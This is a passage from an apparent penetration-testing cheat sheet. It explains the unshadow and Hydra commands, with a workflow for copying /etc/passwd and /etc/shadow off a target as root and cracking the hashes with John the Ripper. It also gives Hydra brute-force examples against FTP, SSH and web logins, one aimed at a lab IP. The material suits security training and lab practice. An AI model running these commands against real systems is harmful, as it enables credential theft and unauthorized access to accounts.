* `--show`: Displays cracked result(s) from hashcat potfile

### Unshadow

* **Combine passwd and shadow files** - Combines `/etc/passwd` and `/etc/shadow` files into a format that John the Ripper can crack

```bash
unshadow /etc/passwd /etc/shadow > hashes.txt
```

* `unshadow`: Utility from the John the Ripper suite that combines passwd and shadow files
* `/etc/passwd`: Contains user account information (username, UID, GID, home directory, shell)
* `/etc/shadow`: Contains password hashes (only readable by root)
* `> hashes.txt`: Outputs the combined file in a format John can crack
* **Usage scenario**: After gaining root access, extract password hashes to crack user passwords
* **Workflow**:
  1. On target machine (as root): `cat /etc/passwd > passwd.txt` and `cat /etc/shadow > shadow.txt`
  2. Transfer files to attacking machine
  3. Run: `unshadow passwd.txt shadow.txt > unshadowed.txt`
  4. Crack with John: `john --wordlist=rockyou.txt unshadowed.txt`
* **Output format**: Combines username from `/etc/passwd` with hash from `/etc/shadow` (e.g., `username:$6$salt$hash:1001:1001:User Name:/home/username:/bin/bash`)
* Useful for password reuse attacks and gaining access to other user accounts on the system

### Hydra

* **FTP Brute Force Attack** - Performs brute force attack against FTP service using a username and password wordlist

```bash
hydra -l eddie -P /usr/share/wordlists/rockyou.txt ftp://10.82.136.134:10021
```

* `hydra`: Parallelized login cracker that supports many protocols
* `-l eddie`: Specifies a single username to test (use `-L users.txt` for a username list)
* `-P /usr/share/wordlists/rockyou.txt`: Specifies password wordlist file (use `-p password` for single password)
* `ftp://10.82.136.134:10021`: Target service URL (protocol://IP:PORT)
* **Supported protocols**: `ftp`, `ssh`, `http`, `https`, `smb`, `rdp`, `telnet`, `mysql`, `postgresql`, `mssql`, `vnc`, `snmp`, `ldap`, etc.
* **Common options**:
  * `-t <threads>`: Number of parallel tasks (default: 16)
  * `-V`: Verbose mode - shows each login attempt
  * `-f`: Stop after first valid password found
  * `-s <port>`: Specify port if non-standard
* **Example with username list**: `hydra -L users.txt -P passwords.txt ftp://target`
* **Example with SSH**: `hydra -l root -P rockyou.txt ssh://target`
* **Example with HTTP POST**: `hydra -l admin -P rockyou.txt http-post-form://target/login.php:username=^USER^&password=^PASS^:F=incorrect`
